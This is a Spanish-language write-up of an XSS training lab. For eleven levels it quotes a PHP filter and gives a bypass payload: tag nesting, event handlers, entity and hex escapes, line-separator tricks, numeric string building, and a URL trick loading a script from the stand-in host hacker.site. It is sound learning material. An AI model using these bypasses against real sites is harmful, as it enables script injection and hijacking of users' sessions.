---
layout: default
---

# XSS

## Teoría


## Laboratorios

Enunciado:
```
XSS labs
CodeName: Find Me!
The XSS labs contain 11 challenges:
Warm-up: XSS level 1
Easy: XSS level 2
Easy: XSS level 3
Easy: XSS level 4
Medium: XSS level 5
Medium: XSS level 6
Medium: XSS level 7
Hard: XSS level 8
Hard: XSS level 9
Hard: XSS level 10
Hard: XSS level 11
Description
The Find Me! labs do not need any introduction! The relevant code snippets are indicated in the challenge page itself.

Each level generates HTML in an unsafe way, and you have to bypass some server-side PHP filters.

The provided solutions are just a few of the many you can have. You can find the solutions at http://info.xss.labs/solutions

As a suggestion, once you will finish these labs, you can try to solve them again using your way and alternative techniques.

The full list of all the labs and the related descriptions are available at http://info.xss.labs/
``` 

Task:

```
Objective
The main goal of these labs is to create a PoC triggering an alert box like this one:

alert('l33t');
If the exploitation has performed successfully, you'll see something like this:

Content Image

Of course, it must be executed without user interaction.

Here's the lab setup:

Content Image

Tools
The best tool for this lab are:

Burp Suite
Local/Remote server web
A web browser
```

## Indice

	1. [Level 1](level1)
	2. [Level 2](level2)
	3. [Level 3](level3)
	4. [Level 4](level4)
	5. [Level 5](level5)
	6. [Level 6](level6)
	7. [Level 7](level7)
	8. [Level 8](level8)
	9. [Level 9](level9)
	10. [Level 10](level10)
	11. [Level 11](level11)
	


core.js :

```js
$(function() {
	$('#searcharea').on('input', function(e) {
		var input = $(this).val();

		$.ajax({
			url : "search.php?keyword="+encodeURIComponent(input),
			cache : false,
			type : "GET",
			success : function(response) {
				$("#results").html(response);
			},
			error : function(xhr) {
				$("#results").html("OMG (ﾉ`□´)ﾉ⌒┻━┻ <br> An error has occurred: <br><b>" + xhr.statusText + "</b>");
				console.debug(xhr);
			}
		});

	});
});
```


### Level 1

```
XSS 1 	This level is just a warm-up to become familiar with the application.
If you have problems here close everything because these are not labs for you! 	WARM-UP 	Simple warm-up
```

Función sanitizadora:

```php
function Sanitizer($search){
  // Let's start...
  return 'Your search "<b>' . $search . '</b>" did not match any products';
}
```

inyección:

```html
<script>alert('l33t')</script>
```


### Level 2

```
XSS 2 	The filter doesn't like the script tags. Are you able to create a valid vector still using the script tag? 	EASY 	To script, or not script.. 
```

Función sanitizadora:
```php
function Sanitizer($search){
  //To script, or not script.. 
  $search = preg_replace('#<script([\s])*>#is', NOSCRIPT, $search);
   
  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```

inyección:

```html
<script <script>>alert('l33t')</script>
```

### Level 3

```
XSS 3 	The script tag filters smeems stronger, isn't it? Alternatives? 	EASY 	To script, or not script... this is no more the problem 
```
Función sanicitadora:

```php
function Sanitizer($search){
  //To script, or not script... this is no more the problem
  $search = preg_replace('#<script(.*?)>#is', NOSCRIPT, $search);
   
  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```

Inyección:

```html
<img/src onerror=alert('l33t')>
```

### Level 4

```
XSS 4 	You know, script tag must be closed and without the events where's the party? 	EASY 	No SCRIPT and no ON? No party then! 
```

Función Sanitizadora:
```php
function Sanitizer($search){
  //Script must be closed, here's a stronger filter... isn't it? 
  $search = preg_replace('#<script(.*?)>(.*?)</script(.*)?>#is', NOSCRIPT, $search);
  //No ON no party!  
  $search = preg_replace('#(on\w+\s*=)#s', NOEVENTS, $search);
  
  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```

Inyección:
```html
<svg><script>alert('l33t')
```


### Level 5

```
XSS 5 	Let's start encoding a little bit 	MEDIUM 	No ON and no Functions? No path then 
```
Función Sanitizadora:
```php
function Sanitizer($search){
  //No ON no party!  
  $search = preg_replace('#(on\w+\s*=)#s', NOEVENTS, $search);
  //No Functions no party! 
  $search = preg_replace('#[()]#s', NOFUNCTIONS, $search);
   
  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```
Inyección:
```html
<svg><script>alert&lpar;'l33t'&rpar;
```


### Level 6

```
XSS 6 	Do you remember your goal? What if I told you that the alert function is blocked? 	MEDIUM 	No alert no party! 
```

Función Sanitizadora:
```php
function Sanitizer($search){
  //No alert no party!  
  $search = preg_replace('#alert#is', NOALERT, $search);

   
  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```

Inyección:

```html
<script>\u0061lert('l33t')</script>
```

### Level 7

```
XSS 7 	No more Unicode escaping.. there are a lot of smart guys out of there. Finally alert is blocked, isn't it? 	MEDIUM 	Am I still able to obfuscate?
```

Función sanitizadora:

```php
function Sanitizer($search){
  // No Unicode escaping.. there are a lot of smart guys out of there...
  // Thanks to stackoverflow.com > http://bit.ly/SO_decode_unicode
  $search = preg_replace_callback('/\\\\u([0-9a-fA-F]{4})/', function ($m) {
	return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
  }, $search);
   
  //No alert no party!  
  $search = preg_replace('#alert#is', NOALERT, $search);

  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```

Inyección:

```html
<script>eval('\x61lert(\'l33t\')')</script>
```

### Level 8

```
XSS 8 	You need to break a commented line 	ADVANCED 	Breaking bad...
```

Función sanitizadora:

```php
function Sanitizer($search){
  // Breaking bad... 
   
  //No alert no party!  
  $search = preg_replace('#alert#is', NOALERT, $search);

  return <<<RESULT
   No products here.. 
   <!-- todo: debug this -->
   <script>
      //console.debug( $search );
   </script>
RESULT;
}
```

inyección: NL == new Line

```html
[NL]eval('\x61lert(\'l33t\')'
```



### Level 9

```
XSS 9 	You need to break a commented line and bypass classic ways to break a line 	ADVANCED 	Breaking bad, season 2...
```

Función sanitizadora:

```php
function Sanitizer($search){
  // Breaking bad... more stronger
   $search = preg_replace('#[\n\r]#', "", $search);
   
  //No alert no party!  
  $search = preg_replace('#alert#is', NOALERT, $search);

  return <<<RESULT
   No products here.. 
   <!-- todo: debug this -->
   <script>
      //console.debug( $search );
   </script>
RESULT;
}
```

Inyección:

```html
[\u2028]eval('\x61lert(\'l33t\')'
```



### Level 10

```
XSS 10 	A mix of rules block you to create the function alert and also the alternative ways to create strings, but not all.. 	ADVANCED 	The numbers rule the world
```

Función sanitizadora:

```php
function Sanitizer($search){
  // No more string ...
  $search = preg_replace('#[\'"+]#', "", $search);
  // ... no more alert ...  
  $search = preg_replace('#alert#is', NOALERT, $search);
  // ... no no more alternative ways!
  $search = preg_replace('#.source#is', "", $search);
  $search = preg_replace('#.fromCharCode#is', "", $search);

  return 'Your search "<b>' + $search + '</b>" did not match any products';
}
```
Inyección:
```html
<script>eval(8680439..toString(30))(983801..toString(36))</script>
```

### Level 11

```
XSS 11 	Bypass the gorilla and you'll become a l33t 	ADVANCED 	OMG a gorilla! 
```

Función snitizadora:

```php
function Sanitizer($search){
   // No scripts from untrusted origins or you'll see a nice gorilla
   preg_match('#^(?:https?:)?\/\/11.xss.labs\/#is', urldecode($search), $matches);   
   if(empty($matches)) $search = "...untrusted...";   

   // don't break the src tag   
   $search = preg_replace('#"#', "", $search);
   // ehehe and now? Are you still a ninja?
   $search = strtoupper($search);
}
```
Inyección:
```html
http://11.xss.labs%2f@hacker.site/x.js
```

[back](./)


